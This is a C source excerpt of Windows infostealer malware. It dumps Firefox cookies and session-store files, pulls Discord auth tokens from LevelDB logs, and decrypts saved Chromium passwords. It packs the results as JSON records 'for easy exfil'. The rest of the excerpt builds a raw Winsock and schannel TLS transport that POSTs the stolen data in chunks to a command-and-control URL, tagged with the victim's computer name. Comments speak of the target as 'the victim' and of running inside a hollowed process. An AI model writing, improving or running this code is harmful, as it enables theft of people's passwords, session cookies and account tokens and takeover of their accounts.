                    DbgInt("DumpFirefox: S_open failed", rc);
                    SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"locked");
                } else {
                    void* st=NULL;
                    const wchar_t* SQL = L"SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
                    int prc=S_prep(con,SQL,-1,&st,NULL);
                    if(prc){
                        DbgInt("DumpFirefox: S_prep failed", prc); S_close(con);
                        SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"unsupported");
                    } else {
                        int rows=0;
                        while(S_step(st)==100){
                            rows++;
                            RecStart();
                            FieldS0("name",st,0); FieldS("value",st,1); FieldS("domain",st,2); FieldS("path",st,3);
                            { char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
                              PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8, pl); }
                            long long expiry = S_int64(st,4);
                            PutS(",\"expirationDate\":"); PutN(expiry);
                            int ss = S_int(st,7);
                            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict
                            FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
                            FieldB("secure",S_int(st,5));
                            FieldB("httpOnly",S_int(st,6));
                            { const char* d=(const char*)S_blob(st,2); FieldB("hostOnly", d && d[0]!='.'); }
                            FieldB("session", expiry==0);
                            PutS("}");
                        }
                        DbgInt("DumpFirefox: rows extracted", rows);
                        SrcAdd("firefox",L"firefox",fd.cFileName,db,rows,rows,0,"");
                        S_fin(st); S_close(con);
                    }
                }
            }
        }
        // Session recovery: sessionstore.jsonlz4 in the profile root, recovery
        // copy in sessionstore-backups\. One source row per file.
        wchar_t lbl[200]; lstrcpynW(lbl,fd.cFileName,150); lstrcatW(lbl,L"-session");
        wchar_t ss[1024];
        lstrcpyW(ss,pdir); lstrcatW(ss,L"\\"); lstrcatW(ss,fd.cFileName); lstrcatW(ss,L"\\sessionstore.jsonlz4");
        if(GetFileAttributesW(ss)!=INVALID_FILE_ATTRIBUTES) DumpFirefoxSessionFile(lbl,ss);
        lstrcpyW(ss,pdir); lstrcatW(ss,L"\\"); lstrcatW(ss,fd.cFileName);
        lstrcatW(ss,L"\\sessionstore-backups\\recovery.jsonlz4");
        if(GetFileAttributesW(ss)!=INVALID_FILE_ATTRIBUTES) DumpFirefoxSessionFile(lbl,ss);
    } while(FindNextFileW(f,&fd));
    FindClose(f);
}

// ------------------------------------------------------------------ Discord token extraction
// Discord keeps the auth token in LevelDB under "Local Storage\leveldb".
// Recent writes live in *.log (the WAL); the old scan only read *.ldb and only
// matched the literal "mfa." prefix, so a freshly logged-in client produced
// nothing. Tokens are user.ts.hmac (optionally prefixed with "mfa.").
static char g_tok[32][132];
static int  g_tok_len[32];
static int  g_tok_n = 0;

static bool IsTokChar(unsigned char c){
    return (c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.';
}

static bool AcceptToken(const char* t, int n){
    int start = 0;
    if(n > 4 && t[0]=='m' && t[1]=='f' && t[2]=='a' && t[3]=='.') start = 4;
    int s[3] = {0,0,0}, k = 0, seg = 0;
    for(int i=start; i<n; i++){
        if(t[i]=='.'){ if(k<3) s[k]=seg; k++; seg=0; }
        else seg++;
    }
    if(k != 2) return false;                       // exactly three parts
    s[2] = seg;
    return s[0] >= 23 && s[0] <= 30 && s[1] >= 5 && s[1] <= 8 && s[2] >= 25 && s[2] <= 45;
}

static void ScanTokens(const char* buf, int n){
    for(int i=0; i<n; i++){
        if(!IsTokChar((unsigned char)buf[i])) continue;
        if(i > 0 && IsTokChar((unsigned char)buf[i-1])) continue;  // only at a run start
        int j = i;
        while(j < n && IsTokChar((unsigned char)buf[j])) j++;
        int len = j - i;
        if(AcceptToken(buf + i, len)){
            bool dup = false;
            for(int k=0; k<g_tok_n; k++)
                if(g_tok_len[k]==len && memcmp(g_tok[k], buf+i, len)==0){ dup=true; break; }
            if(!dup && g_tok_n < 32){
                memcpy(g_tok[g_tok_n], buf+i, len);
                g_tok_len[g_tok_n] = len;
                g_tok_n++;
            }
        }
        i = j;
    }
}

static void EmitTokens(void){
    for(int k=0; k<g_tok_n; k++){
        RecStart();
        PutS("\"domain\":\"discord.com\",\"name\":\"token\"");
        PutS(",\"browser\":\"discord\",\"profile\":\"leveldb\"");
        PutS(",\"value\":"); PutJ(g_tok[k], g_tok_len[k]);
        PutS(",\"path\":\"/\",\"expirationDate\":0,\"sameSite\":\"None\",");
        PutS("\"secure\":true,\"httpOnly\":false,\"hostOnly\":false,\"session\":true}");
    }
}

static void DumpDiscordTokens(const wchar_t* appdata){
    Dbg("DumpDiscordTokens: entry");
    const wchar_t* alts[] = { L"\\Discord\\Local Storage\\leveldb",
                              L"\\DiscordPTB\\Local Storage\\leveldb",
                              L"\\DiscordCanary\\Local Storage\\leveldb",
                              L"\\Lightcord\\Local Storage\\leveldb" };
    const wchar_t* lbls[] = { L"Discord", L"DiscordPTB", L"DiscordCanary", L"Lightcord" };
    const wchar_t* exts[] = { L"\\*.ldb", L"\\*.log" };
    for(int alt=0; alt<4; alt++){
        wchar_t dir[1024]; lstrcpyW(dir, appdata); lstrcatW(dir, alts[alt]);
        if(GetFileAttributesW(dir)==INVALID_FILE_ATTRIBUTES) continue;
        int before = g_tok_n;
        for(int e=0; e<2; e++){
            wchar_t pattern[1024]; lstrcpyW(pattern, dir); lstrcatW(pattern, exts[e]);
            WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pattern,&fd);
            if(f==INVALID_HANDLE_VALUE) continue;
            do {
                wchar_t fp[1100]; lstrcpyW(fp,dir); lstrcatW(fp,L"\\"); lstrcatW(fp,fd.cFileName);
                HANDLE hf = CreateFileW(fp, GENERIC_READ,
                    FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, 0, NULL);
                if(hf==INVALID_HANDLE_VALUE) continue;
                LARGE_INTEGER sz; GetFileSizeEx(hf,&sz);
                if(sz.QuadPart > 4194304 || sz.QuadPart <= 0){ CloseHandle(hf); continue; }
                int fsize = (int)sz.QuadPart;
                char* buf = (char*)VirtualAlloc(NULL, fsize+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
                if(!buf){ CloseHandle(hf); continue; }
                DWORD rd=0; ReadFile(hf, buf, fsize, &rd, NULL);
                CloseHandle(hf);
                if(rd){ ScanTokens(buf, (int)rd); }
                VirtualFree(buf, 0, MEM_RELEASE);
            } while(FindNextFileW(f,&fd));
            FindClose(f);
        }
        int found = g_tok_n - before;
        SrcAdd("leveldb", L"discord", lbls[alt], dir, found, found, 0, "");
    }
    DbgInt("DumpDiscordTokens: tokens found", g_tok_n);
    EmitTokens();
    Dbg("DumpDiscordTokens: done");
}

// ------------------------------------------------------------------ Browser saved passwords (Chromium Login Data)
// Same AES-256-GCM encryption as cookies, same key (v10/v11/v20).
// Path: <profile>\Login Data (SQLite: logins table)
static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
                           const wchar_t* prof, const wchar_t* exe){
    Dbg("DumpPasswords: entry");
    wchar_t tmp[MAX_PATH];
    if(!CopyDb(prof, tmp, MAX_PATH, exe, L"logins")){
        Dbg("DumpPasswords: copy failed");
        SrcAdd("logins", name, pname, prof, 0, 0, 0, "locked");
        return;
    }
    Dbg("DumpPasswords: copy OK");

    char path8[1024]; ToUtf8(tmp,path8,sizeof(path8));
    void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
    if(rc||!con){
        DbgInt("DumpPasswords: S_open failed", rc);
        SrcAdd("logins", name, pname, prof, 0, 0, 0, "locked");
        return;
    }
    Dbg("DumpPasswords: S_open OK");
    void* st=NULL;
    const wchar_t* SQL = L"SELECT origin_url, username_value, password_value FROM logins;";
    rc=S_prep(con,SQL,-1,&st,NULL);
    if(rc){
        DbgInt("DumpPasswords: S_prep failed", rc); S_close(con);
        SrcAdd("logins", name, pname, prof, 0, 0, 0, "unsupported");
        return;
    }
    Dbg("DumpPasswords: S_prep OK, stepping");
    int rows=0, dec_ok=0, dec_fail=0;
    while(S_step(st)==100){
        rows++;
        const char* url=(const char*)S_blob(st,0); int url_len=S_bytes(st,0);
        const char* user=(const char*)S_blob(st,1); int user_len=S_bytes(st,1);
        const char* enc=(const char*)S_blob(st,2); int enc_len=S_bytes(st,2);

        // Decrypt password (same as cookies: v10/v20 + AES-256-GCM)
        // Note: passwords do NOT have the SHA256 domain hash prefix (only cookies do).
        // DecCookie will check SHA256(url) and not strip since it won't match.
        // Chromium stores passwords as UTF-16LE; convert to UTF-8 for JSON.
        // Same oversized-blob hazard as cookies in DumpChromium: password blobs are
        // heap-allocated by size instead of a fixed 4KB stack buffer.
        char* pwd = (enc_len > 0 && enc_len <= 4194304)
            ? (char*)VirtualAlloc(NULL, (size_t)enc_len * 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
        int pwd_len=0;
        bool pwd_ok = false;
        if(pwd && enc_len > 3 && enc[0]=='v'){
            pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len, url);
        }
        if(pwd_ok){
            dec_ok++;
            // Chrome stores the password as UTF-16LE. An ASCII password is
            // valid UTF-8 and stays as-is; anything else (accents) is
            // converted. The old odd-byte-zero test turned "senha@ção"
            // into binary garbage on the target.
            if(pwd_len >= 2 && pwd_len % 2 == 0 && !LooksUtf8(pwd, pwd_len)){
                // Convert UTF-16LE to UTF-8 (BMP). The output buffer is 2x the
                // blob size: a 2-byte code unit can become 3 UTF-8 bytes, and
                // the old in-place conversion could write past enc_len.
                int u8len = 0;
                for(int k=0; k<pwd_len; k+=2){
                    unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
                    if(ch < 0x80) pwd[u8len++] = (char)ch;
                    else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
                    else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
                }
                pwd_len = u8len;
            }
        }
        else{
            // Decryption failed â€” write empty value instead of raw encrypted bytes
            // (raw v10 blobs are useless and pollute the JSON with binary garbage)
            pwd_len = 0;
            dec_fail++;
        }

        RecStart();
        // Store as a cookie-like entry for easy exfil
        PutS("\"domain\":"); PutJ(url, url_len);
        PutS(",\"name\":\"password\"");
        { char b8[64]; int bl=ToUtf8(name,b8,sizeof(b8));
          PutS(",\"browser\":"); PutJ(b8, bl);
          char p8[64]; int pl=ToUtf8(pname,p8,sizeof(p8));
          PutS(",\"profile\":"); PutJ(p8, pl); }
        PutS(",\"value\":"); PutJ(pwd, pwd_len);
        PutS(",\"path\":\"/\"");
        PutS(",\"expirationDate\":0,\"sameSite\":\"None\"");
        PutS(",\"secure\":true,\"httpOnly\":true,\"hostOnly\":false,\"session\":true");
        PutS(",\"_username\":"); PutJ(user, user_len);
        PutS("}");
        if(pwd) VirtualFree(pwd, 0, MEM_RELEASE);
    }
    DbgInt("DumpPasswords: rows extracted", rows);
    DbgInt("DumpPasswords: decrypted OK", dec_ok);
    DbgInt("DumpPasswords: decrypt failed", dec_fail);
    const char* skip = "";
    if(rows>0 && dec_ok==0 && g_need20 && !g_has20) skip = "no-key";
    else if(rows>0 && dec_ok==0 && dec_fail>0 && !g_has10) skip = "v10-fail";
    SrcAdd("logins", name, pname, prof, rows, dec_ok, dec_fail, skip);
    S_fin(st); S_close(con);
    Dbg("DumpPasswords: done");
}

// One Login Data per profile directory, discovered instead of assuming the
// names Default / Profile 1..9 -- custom-named profiles were invisible.
static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_t* exe){
    wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
    WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pat,&fd);
    if(f!=INVALID_HANDLE_VALUE){
        do{
            if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if(fd.cFileName[0]==L'.') continue;
            wchar_t prof[1024]; lstrcpyW(prof,root); lstrcatW(prof,L"\\");
            lstrcatW(prof,fd.cFileName); lstrcatW(prof,L"\\Login Data");
            if(GetFileAttributesW(prof)==INVALID_FILE_ATTRIBUTES) continue;
            DumpPasswordDb(name, fd.cFileName, prof, exe);
        } while(FindNextFileW(f,&fd));
        FindClose(f);
    }
    // Electron/CEF userData root can hold Login Data directly.
    wchar_t prof[1024]; lstrcpyW(prof,root); lstrcatW(prof,L"\\Login Data");
    if(GetFileAttributesW(prof)!=INVALID_FILE_ATTRIBUTES)
        DumpPasswordDb(name, L".", prof, exe);
}

// ------------------------------------------------------------------ HTTP exfiltration (Winsock2)
// WinHTTP/WinINet fail in hollowed process (err 12029 - proxy config unavailable).
// Raw Winsock2 works: socket() + connect() + send() with no config dependency.
// SOCKET is UINT_PTR on x64. The old `int` typedefs truncated the handle and
// every send()/recv() on it failed -- the dump stayed on the victim.
typedef UINT_PTR CK_SOCKET;
#define CK_INVALID_SOCKET ((CK_SOCKET)(~0))
struct CK_WSADATA { char _[512]; };  // real WSADATA is 408 bytes; 400 overflowed the stack
#pragma pack(push,1)
struct CK_SOCKADDR_IN {
    short sin_family;       // AF_INET = 2
    unsigned short sin_port; // network byte order (htons)
    unsigned long sin_addr;  // network byte order (inet_addr)
    char sin_zero[8];
};
#pragma pack(pop)
struct CK_TIMEVAL { long tv_sec; long tv_usec; };
struct CK_FD_SET  { unsigned int fd_count; CK_SOCKET fd_array[64]; };
struct CK_HOSTENT { char* h_name; char** h_aliases; short h_addrtype; short h_length; char** h_addr_list; };

static char g_victim[64];

static void VictimName(void){
    if(g_victim[0]) return;
    DWORD n = (DWORD)sizeof(g_victim);
    if(!GetComputerNameA(g_victim, &n) || !g_victim[0]) lstrcpyA(g_victim, "?");
    else g_victim[n < sizeof(g_victim) ? n : sizeof(g_victim)-1] = 0;
}

// http://HOST[:PORT][/PATH] or https://HOST[:PORT][/PATH] -- scheme optional,
// case-insensitive. https selects the schannel transport and defaults to 443.
static bool ParseC2(const char* url, char* host, int hostcap, int* port,
                    char* path, int pathcap, bool* tls){
    const char* p = url;
    *tls = false;
    if((p[0]=='h'||p[0]=='H') && (p[1]=='t'||p[1]=='T') && (p[2]=='t'||p[2]=='T') &&
       (p[3]=='p'||p[3]=='P')){
        p += 4;                                   // past "http"
        if(*p=='s' || *p=='S'){ *tls = true; p++; }
        if(*p==':') p++;
        if(p[0]=='/' && p[1]=='/') p += 2;
    }
    if(!*p) return false;
    int hp = 0; *port = *tls ? 443 : 80;
    while(*p && *p!='/' && *p!=':' && hp < hostcap-1) host[hp++] = *p++;
    host[hp] = 0;
    if(!hp) return false;
    if(*p==':'){
        p++; int v = 0;
        while(*p>='0' && *p<='9'){ v = v*10 + (*p-'0'); p++; }
        if(v > 0 && v <= 65535) *port = v;
    }
    const char* q = (*p=='/') ? p : "/";
    int i = 0;
    while(q[i] && i < pathcap-1){ path[i] = q[i]; i++; }
    path[i] = 0;
    return true;
}

// ------------------------------------------------------------------ transports
// Raw Winsock and schannel share one send loop. SOCKET is UINT_PTR on x64.
typedef int (WINAPI *tCkSend)(CK_SOCKET, const char*, int, int);
typedef int (WINAPI *tCkRecv)(CK_SOCKET, char*, int, int);

static bool SendAll(tCkSend fSend, CK_SOCKET s, const char* p, int n){
    int off = 0;
    while(off < n){
        int r = fSend(s, p + off, n - off, 0);
        if(r <= 0) return false;
        off += r;
    }
    return true;
}

struct CkTls {
    CredHandle cred;
    CtxtHandle ctx;
    bool have_cred;
    bool have_ctx;
    SecPkgContext_StreamSizes sizes;
};

static bool HostWide(const char* host, wchar_t* out, int cap){
    int i = 0;
    for(; host[i] && i < cap - 1; i++) out[i] = (wchar_t)(unsigned char)host[i];
    out[i] = 0;
    return i > 0;
}

// Chain + hostname validation. schannel is created with manual validation so a
// server certificate that fails here never gets a request -- same model curl and
// browsers use, with the system root store and no revocation fetch (a victim
// behind a captive portal must not hang on a CRL).
static bool TlsValidate(CtxtHandle* ctx, const char* host){
    PCCERT_CONTEXT cert = NULL;
    SECURITY_STATUS ss = QueryContextAttributesA(ctx, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &cert);
    if(ss != SEC_E_OK || !cert){ DbgInt("TLS: no remote cert", (int)ss); return false; }
    wchar_t whost[128];
    if(!HostWide(host, whost, sizeof(whost)/sizeof(whost[0]))){
        CertFreeCertificateContext(cert); return false;
    }

    CERT_CHAIN_PARA cp; memset(&cp, 0, sizeof(cp)); cp.cbSize = sizeof(cp);
    PCCERT_CHAIN_CONTEXT chain = NULL;
    HCERTCHAINENGINE engine = NULL;
#ifdef DEBUG
    // Bench-only: trust one local CA without touching the machine root store
    // (adding to Root prompts for consent on a non-elevated desktop). Release
    // builds compile this out and validate against the system roots only.
    HCERTSTORE bench = CertOpenStore(CERT_STORE_PROV_FILENAME_A, 0, 0,
        CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
        "C:\\ProgramData\\MediaCache\\bench-ca.cer");
    CERT_CHAIN_ENGINE_CONFIG ec; memset(&ec, 0, sizeof(ec)); ec.cbSize = sizeof(ec);
    if(bench){
        ec.hExclusiveRoot = bench;
        if(CertCreateCertificateChainEngine(&ec, &engine))
            Dbg("TLS: bench CA loaded (exclusive root)");
        else
            Dbg("TLS: bench CA engine create failed");
    }
#endif
    BOOL got = CertGetCertificateChain(engine, cert, NULL, cert->hCertStore, &cp, 0, NULL, &chain);
#ifdef DEBUG
    if(engine) CertFreeCertificateChainEngine(engine);
    if(bench) CertCloseStore(bench, 0);
#endif
    if(!got || !chain){
        Dbg("TLS: chain build failed");
        CertFreeCertificateContext(cert);
        return false;
    }

    HTTPSPolicyCallbackData ssl; memset(&ssl, 0, sizeof(ssl));
    ssl.cbSize = sizeof(ssl);
    ssl.dwAuthType = AUTHTYPE_SERVER;
    ssl.pwszServerName = whost;

    CERT_CHAIN_POLICY_PARA pp; memset(&pp, 0, sizeof(pp));
    pp.cbSize = sizeof(pp);
    pp.pvExtraPolicyPara = &ssl;

    CERT_CHAIN_POLICY_STATUS ps; memset(&ps, 0, sizeof(ps));
    ps.cbSize = sizeof(ps);
    BOOL verified = CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, chain, &pp, &ps);
    bool ok = verified && ps.dwError == 0;
    if(!ok) DbgInt("TLS: certificate policy error", (int)ps.dwError);

    CertFreeCertificateChain(chain);
    CertFreeCertificateContext(cert);
    return ok;
}

// One TLS 1.2 client handshake over an already-connected socket. The socket is
// blocking with SO_RCVTIMEO set by the caller. Host doubles as SNI.
//
// Every output token goes into this caller-owned buffer. When pvBuffer is NULL
// SspiCli allocates the token itself, and on some hosts that allocation fails
// with SEC_E_INSUFFICIENT_MEMORY / GetLastError 1450 before a single byte is
// built -- even for the Negotiate package, so it is the allocator, not the
// TLS config. curl passes its own buffer for the same reason. cbMaxToken for
// this package is 24 KB; the payload is single-threaded, so one static scratch.
static char g_tls_tok[65536];

static bool TlsHandshake(CkTls* t, CK_SOCKET s, const char* host, tCkSend fSend, tCkRecv fRecv){
    memset(t, 0, sizeof(*t));

    SCHANNEL_CRED sc; memset(&sc, 0, sizeof(sc));
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // TLS 1.3 is still absent on some Win10
    sc.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION | SCH_USE_STRONG_CRYPTO;

    TimeStamp ts;
    SECURITY_STATUS ss = AcquireCredentialsHandleA(NULL, (SEC_CHAR*)UNISP_NAME_A, SECPKG_CRED_OUTBOUND,
                          NULL, &sc, NULL, NULL, &t->cred, &ts);
    if(ss != SEC_E_OK){ DbgInt("TLS: AcquireCredentialsHandle failed", (int)ss); return false; }
    t->have_cred = true;

    ULONG attrs = 0;
    SecBuffer outb; outb.BufferType = SECBUFFER_TOKEN; outb.cbBuffer = sizeof(g_tls_tok); outb.pvBuffer = g_tls_tok;
    SecBufferDesc outd; outd.ulVersion = SECBUFFER_VERSION; outd.cBuffers = 1; outd.pBuffers = &outb;

    ss = InitializeSecurityContextA(&t->cred, NULL, (SEC_CHAR*)host, 0, 0, 0, NULL, 0,
                                    &t->ctx, &outd, &attrs, &ts);
    if(ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_OK){
        DbgInt("TLS: ClientHello failed", (int)ss);
        return false;
    }
    t->have_ctx = true;

    char inbuf[18432]; int inlen = 0;
    for(int round = 0; round < 64; round++){
        if(outb.cbBuffer && outb.pvBuffer){
            bool sent = SendAll(fSend, s, (const char*)outb.pvBuffer, (int)outb.cbBuffer);
            if(!sent){ Dbg("TLS: handshake token send failed"); return false; }
        }
        if(ss == SEC_E_OK) break;
        if(ss == SEC_E_INCOMPLETE_MESSAGE || inlen == 0){
            if(inlen >= (int)sizeof(inbuf)){ Dbg("TLS: handshake buffer full"); return false; }
            int r = fRecv(s, inbuf + inlen, (int)sizeof(inbuf) - inlen, 0);
            if(r <= 0){ DbgInt("TLS: handshake recv failed", r); return false; }
            inlen += r;
        }

        SecBuffer inb[2];
        inb[0].BufferType = SECBUFFER_TOKEN; inb[0].cbBuffer = inlen; inb[0].pvBuffer = inbuf;
        inb[1].BufferType = SECBUFFER_EMPTY; inb[1].cbBuffer = 0; inb[1].pvBuffer = NULL;
        SecBufferDesc ind; ind.ulVersion = SECBUFFER_VERSION; ind.cBuffers = 2; ind.pBuffers = inb;
        outb.BufferType = SECBUFFER_TOKEN; outb.cbBuffer = sizeof(g_tls_tok); outb.pvBuffer = g_tls_tok;

        ss = InitializeSecurityContextA(&t->cred, &t->ctx, (SEC_CHAR*)host, 0, 0, 0, &ind, 0,
                                        &t->ctx, &outd, &attrs, &ts);
        if(inb[1].BufferType == SECBUFFER_EXTRA){
            int extra = (int)inb[1].cbBuffer;
            if(extra > 0 && extra <= inlen) memmove(inbuf, inbuf + (inlen - extra), extra);
            inlen = extra;
        } else {
            inlen = 0;
        }
        if(ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_INCOMPLETE_MESSAGE){
            DbgInt("TLS: handshake failed", (int)ss);
            return false;
        }
    }
    if(ss != SEC_E_OK){ Dbg("TLS: handshake did not complete"); return false; }

    if(QueryContextAttributesA(&t->ctx, SECPKG_ATTR_STREAM_SIZES, &t->sizes) != SEC_E_OK){
        Dbg("TLS: stream sizes unavailable"); return false;
    }
    return TlsValidate(&t->ctx, host);
}

static bool HttpStatusOk(const char* p, int n){
    // "HTTP/1.1 200" / "HTTP/1.0 200": bytes 8..11 are " 200"
    return n >= 12 && p[0]=='H' && p[1]=='T' && p[2]=='T' && p[3]=='P' && p[4]=='/' &&
           p[8]==' ' && p[9]=='2' && p[10]=='0' && p[11]=='0';
}

static bool RecvStatus(tCkRecv fRecv, CK_SOCKET s){
    char resp[64];
    int r = fRecv(s, resp, sizeof(resp), 0);
    if(r <= 0) return false;
    return HttpStatusOk(resp, r);
}

// TLS equivalent: read one record and decrypt it before checking the status
// line. Without this every 4xx looked like a successful delivery.
static bool TlsRecvStatus(CkTls* t, tCkRecv fRecv, CK_SOCKET s){
    char enc[18432];
    int enclen = 0;
    for(int round = 0; round < 16; round++){
        int r = fRecv(s, enc + enclen, (int)sizeof(enc) - enclen, 0);
        if(r <= 0) return false;
        enclen += r;

        SecBuffer b[4];
        b[0].BufferType = SECBUFFER_DATA;  b[0].cbBuffer = enclen; b[0].pvBuffer = enc;
        b[1].BufferType = SECBUFFER_EMPTY; b[1].cbBuffer = 0;      b[1].pvBuffer = NULL;
        b[2].BufferType = SECBUFFER_EMPTY; b[2].cbBuffer = 0;      b[2].pvBuffer = NULL;
        b[3].BufferType = SECBUFFER_EMPTY; b[3].cbBuffer = 0;      b[3].pvBuffer = NULL;
        SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 4; d.pBuffers = b;

        SECURITY_STATUS ss = DecryptMessage(&t->ctx, &d, 0, NULL);
        if(ss == SEC_E_INCOMPLETE_MESSAGE) continue;
        if(ss != SEC_E_OK) return false;
        for(int i = 0; i < 4; i++){
            if(b[i].BufferType == SECBUFFER_DATA && b[i].cbBuffer > 0)
                return HttpStatusOk((const char*)b[i].pvBuffer, (int)b[i].cbBuffer);
        }
        return false;
    }
    return false;
}

static bool TlsSend(CkTls* t, tCkSend fSend, CK_SOCKET s, const char* data, int len){
    char buf[18432];
    int maxmsg = (int)t->sizes.cbMaximumMessage;
    int header = (int)t->sizes.cbHeader;
    int trailer = (int)t->sizes.cbTrailer;
    if(maxmsg <= 0 || header <= 0 || trailer < 0) return false;
    if(header + maxmsg + trailer > (int)sizeof(buf))
        maxmsg = (int)sizeof(buf) - header - trailer;

    while(len > 0){
        int n = len > maxmsg ? maxmsg : len;
        memcpy(buf + header, data, n);
        SecBuffer b[4];
        b[0].BufferType = SECBUFFER_STREAM_HEADER; b[0].cbBuffer = header;          b[0].pvBuffer = buf;
        b[1].BufferType = SECBUFFER_DATA;          b[1].cbBuffer = n;               b[1].pvBuffer = buf + header;
        b[2].BufferType = SECBUFFER_STREAM_TRAILER;b[2].cbBuffer = trailer;         b[2].pvBuffer = buf + header + n;
        b[3].BufferType = SECBUFFER_EMPTY;         b[3].cbBuffer = 0;               b[3].pvBuffer = NULL;
        SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 4; d.pBuffers = b;
        if(EncryptMessage(&t->ctx, 0, &d, 0) != SEC_E_OK){ Dbg("TLS: EncryptMessage failed"); return false; }
        int total = (int)(b[0].cbBuffer + b[1].cbBuffer + b[2].cbBuffer);
        if(!SendAll(fSend, s, buf, total)) return false;
        data += n; len -= n;
    }
    return true;
}

// close_notify so the Python listener sees a clean TLS EOF instead of SSLEOFError.
static void TlsTeardown(CkTls* t, CK_SOCKET s, tCkSend fSend, bool send_close){
    if(t->have_ctx){
        if(send_close){
            SecBuffer b; b.BufferType = SECBUFFER_TOKEN; b.cbBuffer = 0; b.pvBuffer = NULL;
            SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 1; d.pBuffers = &b;
            if(ApplyControlToken(&t->ctx, &d) == SEC_E_OK){
                SecBuffer ob; ob.BufferType = SECBUFFER_TOKEN; ob.cbBuffer = sizeof(g_tls_tok); ob.pvBuffer = g_tls_tok;
                SecBufferDesc od; od.ulVersion = SECBUFFER_VERSION; od.cBuffers = 1; od.pBuffers = &ob;
                ULONG attrs = 0; TimeStamp ts;
                if(InitializeSecurityContextA(&t->cred, &t->ctx, NULL, 0, 0, 0, NULL, 0,
                                             &t->ctx, &od, &attrs, &ts) == SEC_E_OK){
                    if(ob.cbBuffer && ob.pvBuffer)
                        SendAll(fSend, s, (const char*)ob.pvBuffer, (int)ob.cbBuffer);
                }
            }
        }
        DeleteSecurityContext(&t->ctx);
        t->have_ctx = false;
    }
    if(t->have_cred){
        FreeCredentialsHandle(&t->cred);
        t->have_cred = false;
    }
}

// ------------------------------------------------------------------ request framing
static int AppStr(char* dst, int cap, int pos, const char* s){
    int n = lstrlenA(s);
    if(pos + n > cap) n = cap - pos;
    if(n > 0) memcpy(dst + pos, s, n);
    return pos + n;
}
static int AppNum(char* dst, int cap, int pos, long long v){
    char t[24]; int n = 0;
    unsigned long long uv = v < 0 ? (unsigned long long)(-v) : (unsigned long long)v;
    if(!uv) t[n++] = '0';
    while(uv){ t[n++] = (char)('0' + uv % 10); uv /= 10; }
    if(v < 0 && pos < cap) dst[pos++] = '-';
    while(n > 0 && pos < cap) dst[pos++] = t[--n];
    return pos;
}
static int BuildPostHeader(char* hdr, int cap, const char* host, int port, const char* path,
                           size_t body_len, bool tls, int chunk_i, int chunk_n){
    int n = 0;
    n = AppStr(hdr, cap, n, "POST "); n = AppStr(hdr, cap, n, path);
    n = AppStr(hdr, cap, n, " HTTP/1.1\r\nHost: "); n = AppStr(hdr, cap, n, host);
    if((tls && port != 443) || (!tls && port != 80)){
        n = AppStr(hdr, cap, n, ":");
        n = AppNum(hdr, cap, n, port);
    }
    n = AppStr(hdr, cap, n,
        "\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/json\r\nContent-Length: ");
    n = AppNum(hdr, cap, n, (long long)body_len);
    n = AppStr(hdr, cap, n, "\r\nConnection: close\r\nX-CookieLog-Host: ");
    n = AppStr(hdr, cap, n, g_victim);
    if(chunk_n > 1){
        n = AppStr(hdr, cap, n, "\r\nX-CookieLog-Chunk: ");
        n = AppNum(hdr, cap, n, chunk_i + 1);
        n = AppStr(hdr, cap, n, "/");
        n = AppNum(hdr, cap, n, chunk_n);
    }
    n = AppStr(hdr, cap, n, "\r\n\r\n");
    return n;
}

// End index (exclusive) of the chunk starting at record i: at most 600 records
// or 384 KB of serialised JSON, so one stalled TLS record does not cost the dump.
static int ChunkEnd(int i){
    if(g_rec_n <= 0) return 0;
    int j = i;
    while(j < g_rec_n){
        size_t end = (j + 1 < g_rec_n) ? g_rec_off[j + 1] : g_rec_end;
        size_t span = end - g_rec_off[i];
        if(j > i && (span > 384u * 1024u || (j - i) >= 600)) break;
        j++;
    }
    return j;
}

static bool ExfilHTTP(const char* url){
    DbgStr("ExfilHTTP: url=", url);
    char host[128], path[256]; int port = 80; bool tls = false;
    if(!ParseC2(url, host, sizeof(host), &port, path, sizeof(path), &tls)){
        Dbg("ExfilHTTP: unparseable URL"); return false;
    }
    VictimName();
    DbgStr("ExfilHTTP: host=", host);
    DbgInt("ExfilHTTP: port", port);
